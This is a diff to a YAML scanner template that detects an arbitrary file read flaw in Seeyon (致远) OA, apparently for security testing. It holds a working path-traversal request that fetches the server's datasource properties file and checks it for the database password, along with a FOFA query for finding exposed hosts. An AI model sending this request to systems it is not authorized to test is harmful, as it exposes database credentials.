@@ -1,21 +1,27 @@
 id: CNVD-2020-62422
 
 info:
-  name: 致远oa系统存在任意文件读取漏洞
+  name: 致远 OA 系统存在任意文件读取漏洞
   author: Aquilao
   severity: high
+  verified: true
   description: |
-    致远OA存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息
-    app="致远互联-OA"
+    致远 OA 系统存在任意文件读取漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息
+    fofa: app="致远互联-OA"
   reference:
     - https://www.CNVD.org.cn/flaw/show/CNVD-2020-62422
   tags: cnvd,cnvd2020,seeyon,fileread
   created: 2020/12/15
+  requires: [seeyon]
+  requires-mode: opportunistic
 
 rules:
   r0:
     request:
       method: GET
       path: /seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties
-    expression: response.status == 200 && response.content_type.icontains("application/x-msdownload") && response.body.bcontains(b"ctpDataSource.password")
+    expression: |
+      response.status == 200 && 
+      response.headers['content-type'].icontains("application/x-msdownload") && 
+      response.body.bcontains(b"ctpDataSource.password")
 expression: r0()
